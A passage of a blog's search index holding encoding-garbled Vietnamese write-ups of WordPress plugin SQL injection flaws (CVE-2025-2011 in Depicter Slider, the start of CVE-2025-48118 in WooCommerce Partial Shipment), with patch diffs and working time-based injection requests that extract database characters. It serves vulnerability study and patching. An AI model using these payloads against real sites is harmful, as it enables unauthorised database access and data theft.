c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n \u003cstrong\u003e5.8.3\u003c/strong\u003e. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n \u003cstrong\u003e3.7.37\u003c/strong\u003e.\u003c/p\u003e","title":"CVE-2022-21661"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Depicter Slider c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Depicter Slider: v3.6.1(vul) v√† v3.6.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file app/src/Controllers/Ajax/LeadsAjaxController.php\nindex, list, export l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class LeadsAjaxController\npublic function index(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::lead()-\u0026gt;get($args); $statusCode = isset($response[\u0026#39;errors\u0026#39;]) ? 400 : 200; return \\Depicter::json($response)-\u0026gt;withStatus($statusCode); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function export(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); // other logic return \\Depicter::json([ \u0026#39;errors\u0026#39; =\u0026gt; [__(\u0026#39;error occurred during the export process\u0026#39;, \u0026#39;depicter\u0026#39;)] ])-\u0026gt;withStatus(400); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nC·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng Sanitize::sql thay cho Sanitize::textfield nh·∫±m ƒë·∫£m b·∫£o param 's' ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL.\nHow it work? ƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa textfield v√† sql ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function textfield, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class Sanitize\nN·∫øu b·∫°n ƒë√£ c√†i PHP Intelephense Extension trong vscode, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch Ctrl + Click v√†o h√†m c·∫ßn ƒë·∫øn. {: .prompt-tip }\ntextfield tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c sanitize b·∫±ng sanitize_text_field, sql c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c escape SQL\npublic static function sql( $input ) { return esc_sql( $input ); } {: file=\u0026ldquo;vendor/averta/wordpress/src/Utility/Sanitize.php v3.2\u0026rdquo; }\nV√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt.\nƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ index, list, hay export l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class LeadsAjaxController. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n.\nüëâ LeadsAjaxController ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω route Ajax. Khi c√≥ request g·ª≠i t·ªõi endpoint /wp-admin/admin-ajax.php?action=action_here\u0026amp;param1=param1_here\u0026amp;paramN=paramN_here, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o handle('LeadsAjaxController@function') ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class LeadsAjaxController\nC·∫£ ba h√†m ta ƒëang focus ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c GET, nh∆∞ng export l·∫°i c√≥ middleware x·ª≠ l√Ω csrf-api, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt index v√† list\nKhi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m index, bi·∫øn $response ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ \\Depicter::lead()-\u0026gt;get($args). Tuy nhi√™n, ph∆∞∆°ng th·ª©c get() l·∫°i ti·∫øp t·ª•c g·ªçi ƒë·∫øn \\Depicter::leadRepository()-\u0026gt;getResults($args), t·ª©c l√† c√πng m·ªôt logic m√† h√†m list ƒë√£ g·ªçi tr·ª±c ti·∫øp. Do ƒë√≥, ta ch·ªçn h√†m list l√†m ƒëi·ªÉm truy v·∫øt ch√≠nh.\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;ids\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;ids\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;sources\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;sources\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateStart\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateStart\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateEnd\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateEnd\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;order\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;order\u0026#39;, \u0026#39;DESC\u0026#39;)), \u0026#39;orderBy\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;orderBy\u0026#39;, \u0026#39;id\u0026#39;)), \u0026#39;page\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;page\u0026#39;, 1)), \u0026#39;perPage\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;perpage\u0026#39;, 10)), \u0026#39;columns\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;columns\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;includeFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;includeFields\u0026#39;, false)), \u0026#39;skipCustomFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;skipCustomFields\u0026#39;, false)) ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nƒê·ªÉ bi·∫øt getResults th·ª±c thi query nh∆∞ n√†o, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function getResults ho·∫∑c Ctrl + Click v√†o getResults\nüëâ Khi t√¨m ki·∫øm, ta th·∫•y k·∫øt qu·∫£ c√≥ hai h√†m getResults. D·ª±a v√†o t√™n class c√≥ th·ªÉ nh·∫≠n th·∫•y s·ª± li√™n quan gi·ªØa class LeadRepository v√† h√†m leadRepository(), nhi·ªÅu kh·∫£ nƒÉng Depicter::leadRepository() s·∫Ω tr·∫£ v·ªÅ m·ªôt instance c·ªßa class LeadRepository. B√™n c·∫°nh ƒë√≥, ta c√≥ th·ªÉ d·ª±a v√†o s·ªë l∆∞·ª£ng tham s·ªë truy·ªÅn v√†o ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c h√†m getResults n√†o m·ªõi l√† h√†m c·∫ßn ph√¢n t√≠ch.\nTa th·∫•y ƒëi·ªÅu ki·ªán if,khi kh√¥ng c√≥ param includeFields th√¨ getLeadsResults s·∫Ω ƒë∆∞·ª£c g·ªçi, quan s√°t getLeadsResults trong c√πng class:\nprotected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u0026gt;lead()-\u0026gt;getTable(); $leads = Lead::new()-\u0026gt;select( \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;{$leadTable}.source_id\u0026#34;, \u0026#34;{$leadTable}.content_id\u0026#34;, \u0026#34;{$leadTable}.content_name\u0026#34;, \u0026#34;{$leadTable}.created_at\u0026#34;, \u0026#34;lf.name as fieldName\u0026#34;, \u0026#34;lf.value as fieldValue\u0026#34; )-\u0026gt;join( \u0026#34;{$this-\u0026gt;leadField()-\u0026gt;getTable()} AS lf\u0026#34;, \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;lf.lead_id\u0026#34; ); // other logic if( ! empty( $args[\u0026#39;s\u0026#39;] ) ){ $search = \u0026#34;\u0026#39;%\u0026#34;. $args[\u0026#39;s\u0026#39;] .\u0026#34;%\u0026#39;\u0026#34;; $leads-\u0026gt;appendRawWhere(\u0026#39;AND\u0026#39;, \u0026#34;( lf.value like {$search} OR {$leadTable}.content_name like {$search} )\u0026#34;); } $results = $this-\u0026gt;paginate( $leads, $args ); } {: file=\u0026ldquo;app/src/Database/Repository/LeadRepository.php v3.2\u0026rdquo; }\nTa th·∫•y param s, n∆°i ƒë∆∞·ª£c b·∫£n v√° b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o c√¢u query b·∫±ng h√†m appendRawWhere. Khi ƒë√≥ 1 ph·∫ßn query t∆∞∆°ng ·ª©ng s·∫Ω l√†:\nAND (lf.value like \u0026#39;%s_here%\u0026#39; OR leadtable.content_name like \u0026#39;%s_here%\u0026#39;) üëâ Nh∆∞ v·∫≠y khi g·ª≠i GET request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi params:\naction=depicter-lead-index\u0026amp;s=payload_here list ƒë∆∞·ª£c g·ªçi v·ªõi duy nh·∫•t param s ƒë∆∞·ª£c th√™m v√†o $args, c√≤n l·∫°i ƒë∆∞·ª£c set gi√° tr·ªã m·∫∑c ƒë·ªãnh getResults ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $args ƒêi·ªÅu ki·ªán if( ! $args['includeFields'] ) trong getResults khi includeFields m·∫∑c ƒë·ªãnh l√† false =\u0026gt; getLeadsResults ƒë∆∞·ª£c g·ªçi Th·ª±c hi·ªán truy v·∫•n g√¢y l·ªói SQLi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Payload ƒë∆∞·ª£c decode:\n999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - Khi ƒë√≥ m·ªôt ph·∫ßn c·ªßa c√¢u query tr·ªü th√†nh\nAND (lf.value like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- \u0026#39; OR leadtable.content_name like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #\u0026#39;) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nSubquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ s ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-2011 trong plugin WordPress Depicter Slider tr∆∞·ªõc phi√™n b·∫£n 3.6.2, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ escape SQL khi·∫øn d·ªØ li·ªáu tr∆∞·ªõc khi ƒë∆∞a v√†o tr·ªü th√†nh chu·ªói thu·∫ßn kh√¥ng th·ªÉ tho√°t ra kh·ªèi '%...%'\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Depicter Slider Plugin \u0026lt;= 3.6.1 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-11-cve-2025-2011/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eDepicter Slider\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.6.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-2011\"\u003eCVE-2025-2011\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/depicter/\"\u003eWordPress Depicter Slider Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.6.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDepicter Slider\u003c/strong\u003e:  v3.6.1(vul) v√† v3.6.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-2011"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Woocommerce Partial Shipment c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Woocommerce Partial Shipment: v3.2(vul) v√† v3.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i Woocommerce Partial Shipment Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file wc-partial-shipment/woocommerce-partial-shipment.php\nNh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong file wc-partial-shipment/woocommerce-partial-shipment.php ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nget_shipment_id v√† get_wxp_shipment_data l√† 2 h√†m thu·ªôc class WXP_Partial_Shipment ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c escape ƒë√∫ng c√°ch tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection.\nHow it work? get_shipment_id v√† get_wxp_shipment_data ƒë·ªÅu ƒë∆∞·ª£c h√†m wxp_order_set_shipped trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng.\nfunction wxp_order_set_shipped(){ $order_id = isset($_POST[\u0026#39;order_id\u0026#39;]) ? $_POST[\u0026#39;order_id\u0026#39;] : 0; // other logic $wxp_shipment = $this-\u0026gt;get_wxp_shipment_data($order_id); if(isset($_POST[\u0026#39;order_id\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;order_id\u0026#39;]){ global $wpdb; $shipment_id = $this-\u0026gt;get_shipment_id($_POST[\u0026#39;order_id\u0026#39;]); if(!$shipment_id){ $data = array( \u0026#39;order_id\u0026#39; =\u0026gt;$order_id, \u0026#39;shipment_id\u0026#39; =\u0026gt;1, \u0026#39;shipment_url\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_num\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_date\u0026#39;=\u0026gt;current_time(\u0026#39;timestamp\u0026#39;,0), ); $wpdb-\u0026gt;insert($wpdb-\u0026gt;prefix.\u0026#34;partial_shipment\u0026#34;,$data,array(\u0026#39;%d\u0026#39;,\u0026#39;%d\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;)); $shipment_id = $wpdb-\u0026gt;insert_id; } // other logic } echo json_encode(array(\u0026#39;order_id\u0026#39;=\u0026gt;$order_id,\u0026#39;status\u0026#39;=\u0026gt;$status_key)); exit(); } üëâ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m get_shipment_id v√† get_wxp_shipment_data truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi.\nƒê·ªÉ x√°c ƒë·ªãnh n∆°i wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a wxp_order_set_shipped trong th∆∞ m·ª•c ch·ª©a plugin.\nwxp_order_set_shipped ƒë∆∞·ª£c construct c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook wp_ajax_wxp_order_set_shipped =\u0026gt; y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p\nüëâ Khi truy c·∫≠p v√†o /wp-admin/admin-ajax.php v·ªõi tham s·ªë:\naction=wxp_order_set_shipped\u0026amp;order_id=payload_here Callback wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi order_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) ·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i\nTa s·ª≠ d·ª•ng subquery trong m·ªánh ƒë·ªÅ FROM v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy v·∫•n con tr∆∞·ªõc ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, sau ƒë√≥ m·ªõi th·ª±c hi·ªán truy v·∫•n ch√≠nh. Khi so s√°nh theo t·ª´ng row, SLEEP ch·ªâ ch·∫°y m·ªôt l·∫ßn trong qu√° tr√¨nh kh·ªüi t·∫°o b·∫£ng t·∫°m, c√°c l·∫ßn so s√°nh ti·∫øp theo s·∫Ω kh√¥ng th·ª±c thi l·∫°i, nh·ªù ƒë√≥ tr√°nh vi·ªác SLEEP b·ªã nh√¢n nhi·ªÅu l·∫ßn.\nV√≠ d·ª• khi g·ª≠i request v·ªõi payload n√†y:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT SLEEP(5)) Th·ªùi gian tr·∫£ v·ªÅ tƒÉng theo c·∫•p s·ªë 